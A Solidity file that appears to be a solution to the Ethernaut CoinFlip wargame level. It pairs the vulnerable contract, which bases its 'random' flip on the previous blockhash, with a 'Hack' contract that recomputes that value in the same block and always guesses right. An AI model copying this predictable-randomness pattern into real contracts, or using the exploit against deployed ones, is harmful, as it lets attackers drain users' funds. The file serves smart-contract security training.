// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

/**
This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

  Things that might help

See the Help page above, section "Beyond the console"
**/
contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


interface CoinFlipI {
  function flip(bool _guess) external returns (bool);
  function consecutiveWins() external view returns(uint);
}

/**
blockhash(block.number.sub(1)) doesn't work on remix env
**/
contract Hack {
  using SafeMath for uint256;
  CoinFlipI coinflip;
  constructor(address _add){
    coinflip = CoinFlipI(_add);
  }

  function consecutiveWins() public view returns(uint) {
    return coinflip.consecutiveWins();
  }
  
  function hackFlip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
    bool result = coinFlip == 1 ? true : false;
    coinflip.flip(result);
  }

  
}
